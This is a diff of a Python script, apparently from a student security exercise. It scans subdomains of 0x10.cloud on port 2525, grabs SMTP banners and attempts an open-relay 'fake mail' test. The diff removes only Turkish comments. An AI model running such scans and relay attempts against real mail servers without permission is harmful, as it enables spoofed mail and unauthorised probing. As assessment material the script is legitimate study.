@@ -6,7 +6,6 @@ import socket
 import time
 
 def exploit_smtp():
-    # Hocanın mail sunucusunu saklayabileceği olası hedefler
     subdomains = ["smtp.0x10.cloud", "mail.0x10.cloud", "0x10.cloud"]
     port = 2525
     
@@ -16,7 +15,7 @@ def exploit_smtp():
     
     for sub in subdomains:
         print(f"[*] Scanning {sub}...")
-        time.sleep(0.2) # Rate limit kuralına uyuyoruz
+        time.sleep(0.2) 
         
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -26,7 +25,6 @@ def exploit_smtp():
             if result == 0:
                 print(f"   [+] Connected to {sub}! Reading banner...")
                 
-                # Sunucunun karşılama mesajını (banner) alıyoruz
                 banner = s.recv(1024).decode('utf-8', errors='ignore')
                 print(f"   [>] Server says: {banner.strip()}")
                 
@@ -36,7 +34,6 @@ def exploit_smtp():
                     print("-> Issue: SMTP Mail Service Exposed on Non-Standard Port")
                     print("-> Impact: Attackers can communicate directly with the mail server.")
                     
-                    # Hard Mode: İçeri sızıp sahte mail atmayı deniyoruz!
                     print("\n[*] Attempting 'Open Relay' bypass (Sending fake mail)...")
                     s.sendall(b"EHLO hacker.com\r\n")
                     time.sleep(0.5)
@@ -49,7 +46,7 @@ def exploit_smtp():
                         print(f"-> Status: Mail routing protected, but service version is leaked: {mail_resp.strip()}")
                     
                     s.close()
-                    return # Zafiyeti bulduk, çıkış yapıyoruz
+                    return 
             s.close()
         except Exception as e:
             print(f"   [-] Error: {e}")
